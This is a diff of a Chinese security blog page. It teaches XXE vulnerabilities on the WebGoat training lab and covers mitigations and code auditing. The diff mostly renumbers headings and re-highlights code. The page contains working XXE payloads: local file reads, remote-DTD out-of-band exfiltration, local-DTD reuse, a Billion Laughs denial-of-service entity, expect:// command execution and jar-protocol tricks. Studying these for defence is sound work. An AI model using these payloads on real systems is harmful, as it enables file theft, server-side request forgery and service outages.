@@ -454,14 +454,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    19 分
+                    21 分
                 </div>
                 
 
@@ -476,8 +476,8 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做为网络安全从业者，对大部分漏洞名称都熟悉，也大概知道怎么利用，能产生什么危害，比如本文要学习的XXE漏洞。在此之前，只知道这个漏洞是XML解析时存在了问题，引用了外部实体，利用可以用来读取文件、探测内网，某些情况还可以执行命令。但是代码中究竟存在了什么问题，怎么修复；XML实体是什么，都有哪些类型；XXE攻击的类型、利用环境和绕过等这些具体的问题就是只知其一不知其二了。本文从一个JAVA的漏洞环境搭建开始到熟悉XXE漏洞的基础知识，再到各种精妙的利用。</p>
-<h2 id="IDEA配置Webgoat环境"><a href="#IDEA配置Webgoat环境" class="headerlink" title="IDEA配置Webgoat环境"></a>IDEA配置Webgoat环境</h2><p>选择<a target="_blank" rel="noopener" href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">IDEA</a>作为JAVA调试工具，<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。使用IDEA调试模式运行Webgoat源码。</p>
+                <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>做为网络安全从业者，对大部分漏洞名称都熟悉，也大概知道怎么利用，能产生什么危害，比如本文要学习的XXE漏洞。在此之前，只知道这个漏洞是XML解析时存在了问题，引用了外部实体，利用可以用来读取文件、探测内网，某些情况还可以执行命令。但是代码中究竟存在了什么问题，怎么修复；XML实体是什么，都有哪些类型；XXE攻击的类型、利用环境和绕过等这些具体的问题就是只知其一不知其二了。本文从一个JAVA的漏洞环境搭建开始到熟悉XXE漏洞的基础知识，再到各种精妙的利用。</p>
+<h2 id="0x02-IDEA配置Webgoat环境"><a href="#0x02-IDEA配置Webgoat环境" class="headerlink" title="0x02 IDEA配置Webgoat环境"></a>0x02 IDEA配置Webgoat环境</h2><p>选择<a target="_blank" rel="noopener" href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">IDEA</a>作为JAVA调试工具，<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。使用IDEA调试模式运行Webgoat源码。</p>
 <h3 id="IDEA汉化插件"><a href="#IDEA汉化插件" class="headerlink" title="IDEA汉化插件"></a>IDEA汉化插件</h3><p>在安装好IDEA后，可使用插件进行汉化，避免某些英语不认识导致误操作，在File-Setting-Plugins中搜索Chinese插件安装即可：<br><img src="https://i.loli.net/2021/08/04/bWxUQuoqHgkiZvT.png"><br>安装完成后重启软件进行使用：<br><img src="https://i.loli.net/2021/08/04/VNtxHrbmJDn6a8z.png"></p>
 <h3 id="WebGoat配置"><a href="#WebGoat配置" class="headerlink" title="WebGoat配置"></a>WebGoat配置</h3><p>然后开始配置源码WebGoat-develop，这里是用IDEA2021.2来导入项目(2021.2选择文件夹打开，然后手动配置；2019.3.2中可以选择导入项目自动配置。)，通过mavn自动下载依赖来启动：<br><img src="https://i.loli.net/2021/08/04/gQJ9ojfDzOa21R5.png"><br>idea会自动下载mvn，默认位置在<code>C:\Users\&lt;用户名&gt;\.m2wrapper\dists\</code>中，需要在setting.xml中配置一下加速仓库地址：</p>
 <pre class="line-numbers language-xml"><code class="language-xml">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>
@@ -495,7 +495,7 @@
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2021/08/04/tYbVoEzBQlZa1Mx.png"><br>在文件-项目结构中配置JDK版本(jdk-15,下载地址：<a target="_blank" rel="noopener" href="http://jdk.java.net/15/">http://jdk.java.net/15/</a>):<br><img src="https://i.loli.net/2021/08/04/VnZADElt6gWNhCu.png"><br>然后在左上角🔨旁边的配置菜单里选择编辑项目配置,添加一个Spring Bot配置，名称为StartWebGoat，主类org.owasp.webgoat.StartWebGoat，这一步可能输入了主类会报错，提示找不到main函数，要等idea扫描一下类，然后就自己好了:<br><img src="https://i.loli.net/2021/08/04/rdx4onaIChsplJR.png"><br>同样配置webwolf(用来验证一些请求的服务，如SSRF之类的)，下面记得设置下更新操作,用来在代码中增加语句后热重载:<br><img src="https://i.loli.net/2021/08/04/zRCi1L4muDyWs2c.png"><br>点击调试按钮，访问本地8080，程序已经运行起来了:<br><img src="https://i.loli.net/2021/08/04/OQBXF76ckWJCLVH.png"><br>然后在<code>src/main/java/org/owasp/webgoat/users/UserService.java</code>中用户名检查断点，浏览器中登录，可以看到成功命中:<br><img src="https://i.loli.net/2021/08/05/Pmfyjs37RA9eVqO.png"><br>再试试热重载，加入一条打印语句，然后重载类:<br><img src="https://i.loli.net/2021/08/05/TSQNfmFGkIe5u2q.png"><br>已经输出了调试语句:<br><img src="https://i.loli.net/2021/08/05/8vltejyMwENUs7f.png"><br>使用burp抓包的时候，选择Firefox来抓包，需要设置本地的代理，在地址栏输入<code>about:config</code>，然后搜索<code>network.proxy.allow_hijacking_localhost</code>，设置为True：<br><img src="https://i.loli.net/2021/08/05/O8nuI1YxJLkUfTd.png"></p>
-<h2 id="XML外部实体攻击-XXE"><a href="#XML外部实体攻击-XXE" class="headerlink" title="XML外部实体攻击(XXE)"></a>XML外部实体攻击(XXE)</h2><blockquote>
+<h2 id="0x03-XML外部实体攻击-XXE"><a href="#0x03-XML外部实体攻击-XXE" class="headerlink" title="0x03 XML外部实体攻击(XXE)"></a>0x03 XML外部实体攻击(XXE)</h2><blockquote>
 <p>XML 外部实体攻击(XXE)是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。</p>
 </blockquote>
 <h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
@@ -522,14 +522,14 @@
 <p><code>!DOCTYPE note</code>定义文档的类型是note;<br><code>!ELEMENT note</code>定义note里的元素；<br><code>!ELEMENT to</code>定义元素to的数据类型是#PCDATA，也可以用ANY;<br><code>!ENTITY to</code>定义元素to的值<br>外部的DOCTYPE声明：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>独立的DTD文件：</p>
-<pre class="line-numbers language-dtd"><code class="language-dtd"><!ELEMENT note (to)>
-<!ELEMENT to (#PCDATA)>
-<!ENTITY to "123"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="XML实体类型"><a href="#XML实体类型" class="headerlink" title="XML实体类型"></a>XML实体类型</h3><p>实体是对数据引用，须在DTD中定义。XML中引用实体的方式是<code>&amp;实体名称;</code>，一般来说需要了解的有下面几种类型：</p>
-<h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体。</p>
-<pre class="line-numbers language-DTD"><code class="language-DTD"><?xml version="1.0" ?>
-<!DOCTYPE note [  <!ELEMENT note (to)><!ENTITY to "123">]>
-<root>&to;</root><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>指ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体。</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&to;">&amp;to;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>ENTITY中关键字为<code>SYSTEM</code>, <code>PUBLIC "id"</code>，具体值是链接指向的文件内容 。</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
 <span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"></span>]>
@@ -587,15 +587,15 @@
 ]>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&r;">&amp;r;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2021/08/06/h5LlsP1qiE9vCGV.png"><br>或者利用远程外部实体：</p>
-<pre class="line-numbers language-mojolicious"><code class="language-mojolicious"><?xml version="1.0"?>
-<!DOCTYPE r [
-<!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE r [
+&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd"></span>
 %param3;
 ]>
-<comment><text>123&p;</text></comment><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123<span class="token entity" title="&p;">&amp;p;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>note.dtd：</p>
-<pre class="line-numbers language-vhdl"><code class="language-vhdl"><span class="token operator">&lt;</span>!<span class="token keyword">ENTITY</span> % data SYSTEM <span class="token string">"file:///c://2.txt"</span><span class="token operator">></span>
-<span class="token operator">&lt;</span>!<span class="token keyword">ENTITY</span> p <span class="token string">"%data;"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///c://2.txt">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">p</span> <span class="token attr-name">"%data;"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2021/08/06/jVDdwZtzBaroSRp.png"></p>
 <h4 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h4><p>有时候没有办法获得回显信息(这里的测试环境会回显错误信息，假装看不见)，可以尝试利用带外数据(Out of Band, OOB)进行利用(或者利用一些延时、错误状态码等判断)：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
@@ -651,26 +651,26 @@
 %local_dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>当然了，将这个<code>C:\Windows\System32\wbem\xml</code>打包成zip，使用工具扫描一波：<br><img src="https://i.loli.net/2021/08/17/DTtkgozCqHjnP1A.png"><br>直接利用：<br><img src="https://i.loli.net/2021/08/17/hioutIApfRKBsX9.png"></p>
 <h4 id="XXE-DOS"><a href="#XXE-DOS" class="headerlink" title="XXE DOS"></a>XXE DOS</h4><p>一个多重实体嵌套的例子：</p>
-<pre class="line-numbers language-dts"><code class="language-dts"><?xml version="1.0"?>
-<!DOCTYPE lolz [
- <!ENTITY lol "lol">
- <!ELEMENT lolz (#PCDATA)>
- <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
- <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
- <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
- <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
- <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
- <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
- <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
- <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
- <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol "lol"></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lolz</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
 ]>
-<lolz>&lol9;</lolz><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>另外在一些JSON格式的请求中可以尝试修改请求头<code>Content-Type: application/xml</code>，可对JSON接口进行XXE测试。</p>
 <h3 id="XXE协议支持"><a href="#XXE协议支持" class="headerlink" title="XXE协议支持"></a>XXE协议支持</h3><p>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中一些协议利用，如PHP开启了expect支持可以进行RCE，PHP XXE RCE:<br>having the PHP Expect module installed can result in code execution from an XXE attack (<!--ENTITY rce SYSTEM “expect://ifconfig” -->).</p>
 <p>JAVA中jar协议的使用方法：</p>
-<pre class="line-numbers language-groovy"><code class="language-groovy">local <span class="token operator">=</span><span class="token operator">></span> jar<span class="token punctuation">:</span>file<span class="token punctuation">:</span><span class="token string">//</span><span class="token string">/var/</span>myarchive<span class="token operator">.</span>zip<span class="token operator">!</span><span class="token operator">/</span>file<span class="token operator">.</span>txt
-remote <span class="token operator">=</span><span class="token operator">></span> jar<span class="token punctuation">:</span>https<span class="token punctuation">:</span><span class="token string">//</span>download<span class="token operator">.</span>host<span class="token operator">.</span>com<span class="token string">/myarchive.zip!/</span>file<span class="token operator">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">local => jar:file:///var/myarchive.zip!/file.txt
+remote => jar:https://download.host.com/myarchive.zip!/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>用jar协议外带数据：<br><img src="https://i.loli.net/2021/08/09/qUa7jxLB5AvMX4V.png"><br>利用jar协议下载临时文件：<br><img src="https://i.loli.net/2021/08/16/V2xt4RdsBUQAEie.png"><br>利用zip中不存在的文件引发报错，抛出临时文件路径(一般默认是用户temp下,Linux默认在容器temp)：<br><img src="https://i.loli.net/2021/08/16/bnmlHqNKrLFJ35y.png"><br>这是一个用来在传输中进行延时的脚本,通过<code>python x.py x.zip</code>使用(x.zip末尾添加00垃圾字符):</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys 
 <span class="token keyword">import</span> time 
@@ -712,8 +712,8 @@ jar_file <span class="token operator">=</span> sys<span class="token punctuation
     server_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> 
     server_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>如果支持netdoc，可以列目录：</p>
-<pre class="line-numbers language-groovy"><code class="language-groovy">netdoc<span class="token punctuation">:</span><span class="token string">//</span><span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="XXE代码审计"><a href="#XXE代码审计" class="headerlink" title="XXE代码审计"></a>XXE代码审计</h2><p>随便找到一个XXE位置，比如当前的提交是在POST路由<code>xxe/blind</code>中，大概的流程如图注释：<br><img src="https://i.loli.net/2021/08/16/BG4I7Z8beJDnQPr.png"><br>主要的XML解析在<code>comments.parseXml</code>中，，所以可以右键parseXml选择转到实现：<br><img src="https://i.loli.net/2021/08/16/5kBpiw9Vle3JnLh.png"><br>parseXML是类Comments的一个方法，通过使用<code>javax.xml.stream.XMLInputFactory</code>和<code>javax.xml.bind.JAXBContext</code>处理XML后返回评论的内容，明显可以看到解析类的使用以及内置的缓解方法:<br><img src="https://i.loli.net/2021/08/16/Hd3ZS69DranPTxC.png"><br>内置的缓解代码通过设置JDK中XMLConstants类属性<code>ACCESS_EXTERNAL_DTD</code>和<code>ACCESS_EXTERNAL_SCHEMA</code>，在<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP备忘录</a>中有详细记录：</p>
+<pre class="line-numbers language-html"><code class="language-html">netdoc:///tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="0x04-XXE代码审计"><a href="#0x04-XXE代码审计" class="headerlink" title="0x04 XXE代码审计"></a>0x04 XXE代码审计</h2><p>随便找到一个XXE位置，比如当前的提交是在POST路由<code>xxe/blind</code>中，大概的流程如图注释：<br><img src="https://i.loli.net/2021/08/16/BG4I7Z8beJDnQPr.png"><br>主要的XML解析在<code>comments.parseXml</code>中，，所以可以右键parseXml选择转到实现：<br><img src="https://i.loli.net/2021/08/16/5kBpiw9Vle3JnLh.png"><br>parseXML是类Comments的一个方法，通过使用<code>javax.xml.stream.XMLInputFactory</code>和<code>javax.xml.bind.JAXBContext</code>处理XML后返回评论的内容，明显可以看到解析类的使用以及内置的缓解方法:<br><img src="https://i.loli.net/2021/08/16/Hd3ZS69DranPTxC.png"><br>内置的缓解代码通过设置JDK中XMLConstants类属性<code>ACCESS_EXTERNAL_DTD</code>和<code>ACCESS_EXTERNAL_SCHEMA</code>，在<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP备忘录</a>中有详细记录：</p>
 <pre class="line-numbers language-java"><code class="language-java"> <span class="token comment" spellcheck="true">// 设置允许对指定协议的外部DTD和外部实体引用的访问。</span>
 xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -763,7 +763,7 @@ org<span class="token punctuation">.</span>apache<span class="token punctuation"
 org<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXParseExceptionpublicId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>然后就针对性的对xml处理的位置进行跟踪，查看关键代码是否进行了安全处理。</p>
 <p>更多详情：<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a target="_blank" rel="noopener" href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a target="_blank" rel="noopener" href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a target="_blank" rel="noopener" href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a target="_blank" rel="noopener" href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a target="_blank" rel="noopener" href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a target="_blank" rel="noopener" href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1453,7 +1453,7 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.7k</span>&nbsp;字
+                class="white-color">15k</span>&nbsp;字
             
             
             
